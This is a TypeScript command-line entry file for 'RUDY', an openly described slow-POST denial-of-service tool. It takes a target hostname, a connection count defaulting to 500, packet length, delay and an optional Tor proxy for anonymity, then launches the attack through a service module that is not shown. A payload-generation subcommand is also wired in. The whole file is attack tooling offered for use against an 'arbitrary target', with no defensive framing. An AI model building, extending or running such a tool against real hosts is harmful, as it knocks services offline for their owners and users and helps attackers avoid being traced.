//
//  cli.ts
//  RUDY
//
//  Created by Sahil Chaddha on 07/05/2018.
//  Copyright © 2018 RUDY. All rights reserved.
//

import * as program from "commander"
import Rudy from "./main"
import ASCIIBanner from "./utils/ascii"
import { TargetNotFound, IError } from "./models/error.model"
import RudyService from "./service/rudy.service"
import logger, { LogLevel } from "./utils/logger"
import GeneratePayload from "./scripts/generatePayload"
const logCategory: string = "RUDY_CLI"
/* tslint:disable object-literal-sort-keys max-line-length */

// Parse Arguments
program
    .version("1.0.0")
    .description("Processes the RUDY attack on an arbitrary target.")
    .option("-t, --target <string>", "Hostname of the target to focus")
    .option("-l, --length <number>", "Length of the TCP Packet (Default : Large Number)")
    .option("-n, --numberOfConnections <number>", "Amount of clients that are going to contact the server. (Default: 500)")
    .option("-m, --method <string>", "HTTP Request Method. (Default: POST)")
    .option("-p, --useTor", "Use Tor Proxy. (Default: false)")
    .option("-d, --delay <number>", "Wait <seconds> before sending another TCP Packet. (Default: 2)")
    .option("-v, --verbose", "Enable Verbose Logs (Default: false)")

program
.command("generatePayload <numberOfLines>")
.action((numberOfLines, cmd) => {
    const script = new GeneratePayload(numberOfLines).run()
})

program
.parse(process.argv)

var rudyService = null

// Shows ASCII banner
ASCIIBanner.showInfo()
.then(() => {
    // Throw Error if Target not specified
    if (program.target == null) {
        throw TargetNotFound
    }

    if (program.verbose) {
        logger.setLogLevel(LogLevel.VERBOSE)
    }

    const config: Rudy.IRudyConfig = {
        target: program.target,
        method: program.method,
        packet_len: program.length,
        maxConnections: program.numberOfConnections,
        delay: program.delay,
        shouldUseTor: program.useTor,
    }
    return config
})
.then((config: Rudy.IRudyConfig) => {
    rudyService = new RudyService(config)
    rudyService.attack()
})
.catch((error: IError) => {
    // Show Help on Error
    logger.error({message: error.message, category: error.category})
    program.help()
    process.exit()
})
